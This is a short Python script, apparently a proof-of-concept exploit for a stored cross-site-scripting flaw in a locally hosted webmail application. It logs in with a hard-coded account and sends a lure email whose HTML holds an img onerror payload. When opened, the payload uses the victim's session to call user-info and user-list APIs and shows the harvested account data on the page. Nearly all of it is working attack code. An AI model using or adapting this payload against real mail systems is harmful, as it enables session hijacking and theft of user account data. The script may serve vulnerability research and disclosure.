import time

import httpx

html = """<p>Hi,</p>
<p>Please review the attached numbers.</p>
<img src="x" onerror="(async()=>{const post=(u,d)=>fetch(u,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)}).then(r=>r.json());const i=await post('/api/user/info',{});const us=await post('/api/user/list',{current_page:1,page_size:10});document.body.innerHTML='<h2>Admin session compromised</h2><pre>'+JSON.stringify({info:i.data,accounts:us.data.list.map(u=>u.Account)},null,2)+'</pre>';})()">"""

client = httpx.Client(base_url="http://127.0.0.1:8080", timeout=30)
client.post("/api/login", json={"account": "bob", "password": "Bob12345."})
resp = client.post("/api/email/send", json={
    "to": [{"name": "Victim", "email": "victim@example.net"}],
    "subject": "Quarterly numbers",
    "html": html,
    "text": "Hi",
    "attrs": [],
})
print(resp.text)
time.sleep(3)
print(client.post("/api/email/list", json={
    "current_page": 1,
    "page_size": 10,
    "tag": '{"type":1,"status":-1,"group_id":-1}',
}).json()["data"]["list"][0]["id"])
